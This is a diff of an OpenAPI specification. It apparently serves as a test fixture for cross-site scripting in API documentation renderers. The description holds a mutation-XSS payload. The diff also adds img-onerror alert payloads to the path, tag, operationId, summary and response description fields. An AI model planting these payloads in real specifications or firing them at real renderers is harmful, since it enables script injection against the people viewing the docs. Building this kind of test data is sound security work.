@@ -4,12 +4,12 @@ info:
   description: |
     <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(document.domain)'>">
 paths:
-  /accounts:
+  /accounts'"><img src=x onerror=alert(1)>:
     get:
       responses:
         '200':
-          description: No response was specified
+          description: No response was specified'"><img src=x onerror=alert(1)>
       tags:
-        - accounts
-      operationId: findAccounts
-      summary: Finds all accounts
+        - accounts'"><img src=x onerror=alert(1)>
+      operationId: findAccounts'"><img src=x onerror=alert(1)>
+      summary: Finds all accounts'"><img src=x onerror=alert(1)>
